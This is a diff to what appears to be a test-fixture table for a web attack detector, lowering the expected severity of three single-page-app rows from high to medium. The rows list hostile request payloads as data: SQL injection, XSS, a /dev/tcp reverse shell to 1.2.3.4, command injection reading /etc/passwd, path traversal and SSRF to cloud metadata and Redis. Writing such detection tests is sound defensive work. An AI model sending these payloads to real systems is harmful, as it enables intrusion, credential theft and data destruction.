@@ -75,7 +75,7 @@ attack	sqli	app	GET	200	3000	=high	/item?id=1%0aunion%0aselect%0a1
 attack	sqli	app	GET	200	3000	=high	/item?id=-1'%20||%20pg_sleep(5)--
 attack	sqli	app	GET	200	3000	=high	/item?id=1+procedure+analyse()
 attack	sqli	app	GET	403	300	=high	/item?id=1+union+select+1,2,3--
-attack	sqli	spa	GET	200	2048	=high@passed	/item?id=1+union+select+1,2,3--
+attack	sqli	spa	GET	200	2048	=medium@passed	/item?id=1+union+select+1,2,3--
 attack	xss	app	GET	200	2000	>=medium	/s?q=<script>alert(1)</script>
 attack	xss	app	GET	200	2000	>=medium	/s?q=hello+world+<script>alert(1)</script>+more+words
 attack	xss	app	GET	200	2000	>=medium	/s?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
@@ -96,7 +96,7 @@ attack	rce	app	GET	200	512	=high	/cmd?c=bash+-i+%3E%26+/dev/tcp/1.2.3.4/4444+0%3
 attack	rce	app	GET	200	512	=high	/run?code=eval($_POST[x])
 attack	rce	app	GET	200	512	=high	/run?code=please+run+system('id')+for+me
 attack	rce	app	GET	200	9000	=critical@success	/ping?host=1;cat+/etc/passwd
-attack	rce	spa	GET	200	2048	=high@passed	/ping?host=1;cat+/etc/passwd
+attack	rce	spa	GET	200	2048	=medium@passed	/ping?host=1;cat+/etc/passwd
 attack	lfi	app	GET	200	4000	=high	/view?f=../../../../etc/passwd
 attack	lfi	app	GET	200	4000	=high	/view?f=..%2f..%2f..%2fetc%2fpasswd
 attack	lfi	app	GET	200	4000	=high	/view?f=%252e%252e%252fetc%252fpasswd
@@ -110,7 +110,7 @@ attack	lfi	app	GET	404	300	=high	/view?f=../../../../etc/passwd
 attack	lfi	app	GET	403	300	=high	/view?f=../../../../etc/passwd
 attack	lfi	app	GET	200	4000	=high	/a/b/../../../../etc/passwd
 attack	lfi	app	GET	200	4000	=high	/static/%2e%2e/%2e%2e/secret.txt
-attack	lfi	spa	GET	200	2048	=high@passed	/view?f=../../../../etc/passwd
+attack	lfi	spa	GET	200	2048	=medium@passed	/view?f=../../../../etc/passwd
 attack	ssrf	app	GET	200	800	=high	/fetch?url=http://169.254.169.254/latest/meta-data/
 attack	ssrf	app	GET	200	800	=high	/fetch?url=http://127.0.0.1:6379/
 attack	ssrf	app	GET	200	800	=high	/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL
